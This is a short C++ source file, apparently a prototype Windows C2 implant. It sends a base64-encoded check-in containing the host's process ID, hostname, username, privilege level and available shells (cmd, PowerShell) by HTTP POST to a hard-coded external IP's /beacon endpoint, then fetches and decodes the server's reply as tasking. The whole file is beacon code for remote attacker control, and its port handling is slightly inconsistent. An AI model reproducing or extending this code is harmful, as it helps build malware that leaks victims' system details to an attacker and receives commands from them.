#include "internet.h"
#include <windows.h>
#include <WinInet.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include "base64.h"
#include "json.hpp"

#pragma comment (lib, "wininet.lib")

using namespace std;
using namespace json;

int main() {

	// HTTP POST Request to C2
	HINTERNET hRequest = SendRequest("http://34.248.147.52:8888/", 80, "/beacon", "POST", "eyJwaWQiOiI5NjAiLCJzZXJ2ZXIiOiJsb2NhbGhvc3QiLCJwbGF0Zm9ybSI6IndpbmRvd3MiLCJob3N0IjoiREVTS1RPUC1UTjFRRE9VIiwidXNlcm5hbWUiOiJhbXJ0aCIsImFyY2hpdGVjdHVyZSI6ImFtZDY0IiwicHJpdmlsZWdlIjoiVXNlciIsICJleGVjdXRvcnMiOlsiY21kIiwgInBzaCJdfQ==");
	cout << hRequest << "\n";
	DWORD Length = 0; 
	// Response from C2
	char* Response = GetResponse(hRequest, &Length);
	cout << Response << "  " << Length << "\n";
    // Decoded Base64 Response
	char* DecodedResponse = b64decode(Response, Length);
	cout << DecodedResponse << "\n";

		return 0;
}
